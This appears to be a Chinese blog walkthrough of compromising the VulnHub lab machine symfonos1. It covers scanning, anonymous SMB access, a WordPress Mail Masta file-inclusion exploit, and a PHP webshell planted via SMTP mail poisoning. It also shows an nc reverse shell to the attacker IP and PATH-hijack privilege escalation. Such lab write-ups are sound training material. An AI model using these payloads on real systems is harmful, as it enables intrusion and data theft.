+++
date = '2026-10-20T19:42:34+08:00'
draft = false
title = '【VulnHub靶机】symfonos1渗透记录'
+++

## 信息收集

攻击机IP: `192.168.200.146`  
使用`arp-scan -l`确定靶机地址(`192.168.200.160`)

```shell
┌──(root㉿kali)-[/home/kali]
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 192.168.200.146
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.200.1   00:50:56:c0:00:08       (Unknown)
192.168.200.2   00:50:56:fc:41:2a       (Unknown)
192.168.200.160 00:0c:29:7a:a8:3c       (Unknown)
192.168.200.254 00:50:56:ec:d0:be       (Unknown)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.929 seconds (132.71 hosts/sec). 4 responded
```

探测开放了哪些端口

```shell
┌──(root㉿kali)-[/home/kali]
└─# nmap --min-rate 10000 -p- 192.168.200.160                                                                          
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-20 19:48 +0800
Nmap scan report for symfonos.local (192.168.200.160)
Host is up (0.000046s latency).
Not shown: 65530 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:7A:A8:3C (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.19 seconds
```

对22,25,80,139,445端口进行版本探测扫描

```shell
┌──(root㉿kali)-[/home/kali]
└─# nmap -sT -sV -sC -O -p22,25,80,139,445 192.168.200.160
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-20 19:50 +0800
Nmap scan report for symfonos.local (192.168.200.160)
Host is up (0.00036s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
| ssl-cert: Subject: commonName=symfonos
| Subject Alternative Name: DNS:symfonos
| Not valid before: 2019-06-29T00:29:42
|_Not valid after:  2029-06-26T00:29:42
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 00:0C:29:7A:A8:3C (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 1 hop
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-10-20T11:50:45
|_  start_date: N/A
|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos
|   NetBIOS computer name: SYMFONOS\x00
|   Domain name: \x00
|   FQDN: symfonos
|_  System time: 2026-10-20T06:50:45-05:00

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.99 seconds
```

对22,25,80,139,445端口进行漏洞扫描

```shell
┌──(root㉿kali)-[/home/kali]
└─# nmap --script=vuln -p22,25,80,139,445 192.168.200.160      
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-20 19:51 +0800
Nmap scan report for symfonos.local (192.168.200.160)
Host is up (0.00030s latency).

PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
| smtp-vuln-cve2010-4344: 
|_  The SMTP server is not Exim: NOT VULNERABLE
| ssl-dh-params: 
|   VULNERABLE:
|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use anonymous
|       Diffie-Hellman key exchange only provide protection against passive
|       eavesdropping, and are vulnerable to active man-in-the-middle attacks
|       which could completely compromise the confidentiality and integrity
|       of any data exchanged over the resulting session.
|     Check results:
|       ANONYMOUS DH GROUP 1
|             Cipher Suite: TLS_DH_anon_WITH_AES_128_GCM_SHA256
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 2048
|             Generator Length: 8
|             Public Key Length: 2048
|     References:
|_      https://www.ietf.org/rfc/rfc2246.txt
80/tcp  open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|_  /manual/: Potentially interesting folder
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:7A:A8:3C (VMware)

Host script results:
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_          
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: false

Nmap done: 1 IP address (1 host up) scanned in 40.49 seconds
```

访问web页面, 发现只有一个图片, 进行目录爆破, 只有一个/manual/index.html, 访问后是Apache服务器文档, 没有什么特别的地方

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E5%BC%80%E5%8F%91/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A0%A1%E5%9B%AD%E5%AF%9D%E5%AE%A4%E9%97%A8%E7%89%8C%E6%88%90%E5%99%A8%E5%BC%80%E5%8F%91/%E8%AE%BF%E9%97%AEweb%E9%A1%B5%E9%9D%A2.avif)

```shell
┌──(root㉿kali)-[/home/kali]
└─# dirsearch -u http://192.168.200.160/ -i 200
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11460

Output File: /home/kali/reports/http_192.168.200.160/__26-10-20_22-09-35.txt

Target: http://192.168.200.160/

[22:09:35] Starting: 
[22:09:51] 200 -  201B  - /manual/index.html

Task Completed
```

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E5%BC%80%E5%8F%91/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A0%A1%E5%9B%AD%E5%AF%9D%E5%AE%A4%E9%97%A8%E7%89%8C%E6%88%90%E5%99%A8%E5%BC%80%E5%8F%91/Apache%E6%96%87%E6%A1%A3.avif)

## 漏洞利用

因为445运行着smb服务, 所以尝试用smbclient匿名列出共享资源

```shell
┌──(kali㉿kali)-[~]
└─$ smbclient -L 192.168.200.160 -N

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        helios          Disk      Helios personal share
        anonymous       Disk      
        IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            SYMFONOS
```

发现匿名共享和一个叫helios的共享, 尝试匿名登录

```shell
┌──(kali㉿kali)-[~]
└─$ smbclient //192.168.200.160/anonymous -N
Try "help" to get a list of possible commands.
smb: \> 
```

登录成功, 使用ls发现存在attention.txt, 把它下载下来

```shell
smb: \> ls
  .                                   D        0  Sat Jun 29 09:14:49 2019
  ..                                  D        0  Sat Jun 29 09:12:15 2019
  attention.txt                       N      154  Sat Jun 29 09:14:49 2019

                19994224 blocks of size 1024. 17293284 blocks available
smb: \> get attention.txt 
getting file \attention.txt of size 154 as attention.txt (18.8 KiloBytes/sec) (average 18.8 KiloBytes/sec)
```

根据attention.txt的内容可知, 该靶机用户很可能使用弱口令

```text
Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! 

Next person I find using one of these passwords will be fired!

-Zeus
```

使用attention.txt中的密码尝试链接helios用户的共享, 最终使用qwerty成功登录

```shell
┌──(root㉿kali)-[/home/kali]
└─# smbclient //192.168.200.160/helios -U helios
Password for [WORKGROUP\helios]:
Try "help" to get a list of possible commands.
smb: \> 
```

查看共享目录中的文件, 发现research.txt和todo.txt, 将它们下载下来

```shell
smb: \> ls
  .                                   D        0  Sat Jun 29 08:32:05 2019
  ..                                  D        0  Sat Jun 29 08:37:04 2019
  research.txt                        A      432  Sat Jun 29 08:32:05 2019
  todo.txt                            A       52  Sat Jun 29 08:32:05 2019

                19994224 blocks of size 1024. 17287840 blocks available
smb: \> get research.txt
getting file \research.txt of size 432 as research.txt (140.6 KiloBytes/sec) (average 140.6 KiloBytes/sec)
smb: \> get todo.txt 
getting file \todo.txt of size 52 as todo.txt (16.9 KiloBytes/sec) (average 78.8 KiloBytes/sec)
```

research.txt中是一篇神话故事, 没什么用, todo.txt中提到在/h3l105工作

```shell
┌──(root㉿kali)-[/home/kali]
└─# cat research.txt 
Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.

┌──(root㉿kali)-[/home/kali]
└─# cat todo.txt 

1. Binge watch Dexter
2. Dance
3. Work on /h3l105
```

浏览器访问http://192.168.200.160/h3l105, 发现是个WordPress站点

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E5%BC%80%E5%8F%91/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A0%A1%E5%9B%AD%E5%AF%9D%E5%AE%A4%E9%97%A8%E7%89%8C%E6%88%90%E5%99%A8%E5%BC%80%E5%8F%91/%E8%AE%BF%E9%97%AEh3l105.avif)

使用wpscan扫描站点, 发现存在两个插件(mail-masta和site-editor)

```shell
[+] mail-masta             
 | Location: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |  
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt

[+] site-editor
 | Location: http://symfonos.local/h3l105/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://symfonos.local/h3l105/wp-content/plugins/site-editor/readme.txt
 ```

 使用searchsploit搜索插件漏洞,发现文件包含漏洞

```shell
┌──(kali㉿kali)-[~]                                                                                                                                                    
└─$ searchsploit mail masta                                                                                                                                            
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                       |  Path                
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Mail Masta 1.0 - Local File Inclusion                                                                               | php/webapps/40290.txt   
WordPress Plugin Mail Masta 1.0 - Local File Inclusion (2)                                                                           | php/webapps/50226.py      
WordPress Plugin Mail Masta 1.0 - SQL Injection                                                                                      | php/webapps/41438.txt
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results                                                                                                                                                 
Papers: No Results 
```

使用40290.txt:  
访问http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd  
发现返回passwd数据

```shell
┌──(kali㉿kali)-[~]
└─$ curl http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
Debian-exim:x:105:109::/var/spool/exim4:/bin/false
messagebus:x:106:111::/var/run/dbus:/bin/false
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
helios:x:1000:1000:,,,:/home/helios:/bin/bash
mysql:x:108:114:MySQL Server,,,:/nonexistent:/bin/false
postfix:x:109:115::/var/spool/postfix:/bin/false
```

尝试包含/var/log/apache2/access.log, 结果返回空  
由于靶机开放了smtp(邮件服务), 我们可以去尝试包含helios的邮件日志

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E5%BC%80%E5%8F%91/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A0%A1%E5%9B%AD%E5%AF%9D%E5%AE%A4%E9%97%A8%E7%89%8C%E6%88%90%E5%99%A8%E5%BC%80%E5%8F%91/%E5%8C%85%E5%90%AB%E9%82%AE%E4%BB%B6%E6%97%A5%E5%BF%97.avif)

成功返回了日志内容, 那么可以向helios发送包含一句话木马, 然后再访问邮件日志, 实现RCE

```shell
telnet 192.168.200.160 25

MAIL FROM: pieyue
RCPT TO: helios
data
<?php system($_GET['cmd']);?>
.

QUIT
```

浏览器访问 http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=whoami 成功返回用户名

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E5%BC%80%E5%8F%91/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A0%A1%E5%9B%AD%E5%AF%9D%E5%AE%A4%E9%97%A8%E7%89%8C%E6%88%90%E5%99%A8%E5%BC%80%E5%8F%91/RCE%E8%BF%94%E5%9B%9E%E7%94%A8%E6%88%B7%E5%90%8D.avif)

使用nc反弹shell:  
http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=nc+192.168.200.146+4444+-e+/bin/bash

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E5%BC%80%E5%8F%91/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A0%A1%E5%9B%AD%E5%AF%9D%E5%AE%A4%E9%97%A8%E7%89%8C%E6%88%90%E5%99%A8%E5%BC%80%E5%8F%91/%E8%8E%B7%E5%BE%97%E5%8F%8D%E5%BC%B9shell.avif)

## 权限提升

升级终端

```shell
python -c "import pty;pty.spawn('/bin/bash')"
```

查找具有SUID位的文件

```shell
helios@symfonos:/home$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/opt/statuscheck
/bin/mount
/bin/umount
/bin/su
/bin/ping
```

发现一个可疑的文件:/opt/statuscheck, 运行后发现输出了HTTP响应, 猜测其调用了curl

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E5%BC%80%E5%8F%91/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A0%A1%E5%9B%AD%E5%AF%9D%E5%AE%A4%E9%97%A8%E7%89%8C%E6%88%90%E5%99%A8%E5%BC%80%E5%8F%91/%E5%8F%91%E7%8E%B0%E8%BF%94%E5%9B%9EHTTP%E5%93%8D%E5%BA%94.avif)

使用strings查看其字符串, 果然发现了curl

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E5%BC%80%E5%8F%91/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A0%A1%E5%9B%AD%E5%AF%9D%E5%AE%A4%E9%97%A8%E7%89%8C%E6%88%90%E5%99%A8%E5%BC%80%E5%8F%91/%E5%8F%91%E7%8E%B0%E8%B0%83%E7%94%A8curl.avif)

那么我们可以使用环境变量劫持提权, 首先在家目录创建提权脚本, 注意加上-p确保权限不降级

```shell
echo '/bin/bash -p' > curl
```

修改PATH环境变量:

```shell
export PATH=/home/helios:$PATH
```

再次运行statuscheck即可提权

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E5%BC%80%E5%8F%91/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A0%A1%E5%9B%AD%E5%AF%9D%E5%AE%A4%E9%97%A8%E7%89%8C%E6%88%90%E5%99%A8%E5%BC%80%E5%8F%91/%E6%8F%90%E6%9D%83%E6%88%90%E5%8A%9F.avif)

拿到flag

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E5%BC%80%E5%8F%91/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A0%A1%E5%9B%AD%E5%AF%9D%E5%AE%A4%E9%97%A8%E7%89%8C%E6%88%90%E5%99%A8%E5%BC%80%E5%8F%91/%E8%8E%B7%E5%BE%97flag.avif)
